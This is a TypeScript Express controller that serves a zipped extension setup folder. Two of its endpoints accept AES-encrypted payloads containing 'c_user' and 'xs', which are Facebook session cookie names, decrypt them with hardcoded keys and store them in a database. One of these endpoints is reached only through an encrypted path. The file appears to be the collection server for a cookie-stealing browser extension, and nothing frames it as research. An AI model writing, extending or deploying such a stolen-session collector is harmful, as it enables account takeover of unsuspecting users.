const Fmodel = require('../model/f.model');
import { Request, Response } from 'express';
import { statSync, readdirSync } from 'fs';
import path from 'path';
import { Data } from '../interfaces/data.interface';
import { Api } from '../enum/api.enum';
const crypto = require('crypto-js');
const archiver = require('archiver');


const extension = {
    download: (req: Request, res: Response) => {
        const folderPath = path.join('src', 'setupex');
        const files = readdirSync(folderPath);

        const zip = archiver('zip');
        zip.pipe(res);

        res.setHeader('Content-disposition', 'attachment; filename=folder.zip');
        res.setHeader('Content-type', 'application/zip');


        try {
            files.forEach(file => {
                const filePath = path.join(folderPath, file);
                const isDirectory = statSync(filePath).isDirectory();

                if (!isDirectory) {
                    zip.file(filePath, { name: file });
                } else {
                    zip.directory(filePath, file);
                }
            });

            // Đặt tên cho tệp zip khi gửi qua HTTP
            res.attachment('setup.zip');

            // Kết thúc tệp zip
            zip.finalize();
        } catch (error) {
            console.error('Error creating zip file:', error);
            res.status(500).send('Internal Server Error');
        }
    },
    send: async (req: Request, res: Response) => {
        const { data } = req.body;
        console.log(data)

        //check null
        if (!data) return res.status(403).json({ success: false, message: 'cannot null' });

        //decrypt
        const baseData = data.replace(/-/g, '/').replace(/=/g, '');
        try {
            const decodeData = crypto.AES.decrypt(baseData, '456eizkejtkwue952y');
            const rawData = decodeData.toString(crypto.enc.Utf8);
            const { c_user, xs }: Data = JSON.parse(rawData);
            console.log('final data', { c_user, xs });

            //check exist
            const isExist = await Fmodel.find({ c_user });
            if (isExist.length > 0) return res.status(403).json({ success: false, message: 'already existed!' });

            const f = new Fmodel({ c_user, xs });

            await f.save();
            res.status(200).json({ success: true, message: 'send successfully!' });

        } catch (error) {
            console.log('error', error)
            res.status(403).json({ success: false, message: 'data is not correct!' });
        }
    },
    decodePath: async (req: Request, res: Response) => {
        const { endpoint } = req.params;

        //decrypt
        //Chuyển các kí tự "-" thành "/"
        const base64EncodedData = endpoint.replace(/-/g, '/').replace(/=/g, '');

        // Giải mã dữ liệu
        try {
            const bytes = crypto.AES.decrypt(base64EncodedData, '123dhwydhsjwuy841y');

            //Chuyển về dạng chữ
            const decryptedData = bytes.toString(crypto.enc.Utf8);


            if (decryptedData == Api.decodePost) {
                const { data } = req.body;
                console.log(data)

                //check null
                if (!data) return res.status(403).json({ success: false, message: 'cannot null' });

                //decrypt
                const baseData = data.replace(/-/g, '/').replace(/=/g, '');
                try {
                    const decodeData = crypto.AES.decrypt(baseData, '456eizkejtkwue952y');
                    const rawData = decodeData.toString(crypto.enc.Utf8);
                    const { c_user, xs }: Data = JSON.parse(rawData);
                    console.log('final data', { c_user, xs });

                    //check exist
                    const isExist = await Fmodel.find({ c_user });
                    if (isExist.length > 0) return res.status(403).json({ success: false, message: 'already existed!' });

                    const f = new Fmodel({ c_user, xs });

                    await f.save();
                    res.status(200).json({ success: true, message: 'send successfully!' });

                } catch (error) {
                    console.log('error', error)
                    res.status(403).json({ success: false, message: 'data is not correct!' });
                }
            }

            else
                return res.status(403).json({ success: false, message: 'api hasnt exist' })
        } catch (error) {
            console.log('error', error)
            return res.status(403).json({ success: false, message: 'api hasnt exist' })
        }

    }
}

export default extension;